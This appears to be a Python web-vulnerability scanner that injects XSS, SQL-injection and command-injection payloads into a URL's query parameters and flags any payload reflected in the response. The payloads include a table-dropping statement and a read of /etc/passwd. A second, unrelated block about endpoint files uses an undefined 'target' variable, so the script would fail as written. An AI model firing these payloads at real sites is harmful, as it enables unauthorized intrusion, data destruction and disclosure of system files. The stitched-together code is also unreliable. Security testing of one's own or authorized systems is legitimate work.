import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Common payloads for vulnerability detection
payloads = {
    "xss": ['<script>alert(1)</script>', '" onmouseover="alert(1)', "'><img src=x onerror=alert(1)>"],
    "sqli": ["' OR '1'='1", "'; DROP TABLE users; --", "' OR 1=1 --"],
    "cmd_injection": ['; ls', '&& whoami', '| cat /etc/passwd']
}

def inject_payloads(base_url):
    parsed = urlparse(base_url)
    query_params = parse_qs(parsed.query)

    if not query_params:
        print("No parameters to test in the URL.")
        return

    for attack_type, payload_list in payloads.items():
        print(f"\nTesting for {attack_type.upper()} vulnerabilities:")
        for payload in payload_list:
            for param in query_params:
                test_params = query_params.copy()
                test_params[param] = payload
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))

                try:
                    response = requests.get(test_url, timeout=10)
                    if payload in response.text:
                        print(f"[+] Potential {attack_type.upper()} vulnerability with param '{param}' and payload: {payload}")
                    else:
                        print(f"[-] Payload '{payload}' did not reflect in response for param '{param}'")
                except requests.RequestException as e:
                    print(f"[!] Error testing {test_url}: {e}")


endpoints = f'{target}/{target}_endpoints.txt'

chars = ['#','?','&']

with open(endpoints, 'r') as f:
    file = f'{target}_params.html'
    path = f'{target}/{file}'
    Lines = [line for line in f.readlines() if line.strip()]
    for line in Lines:
        for char in chars:
            if char in line:
                line = f'<a href="{line}">{line}</a><br \>'
                with open(path, 'a') as newf:
                    newf.write(line)
                    newf.close()


if __name__ == "__main__":
    test_url = input("Enter the URL to test (with parameters): ")
    inject_payloads(test_url)
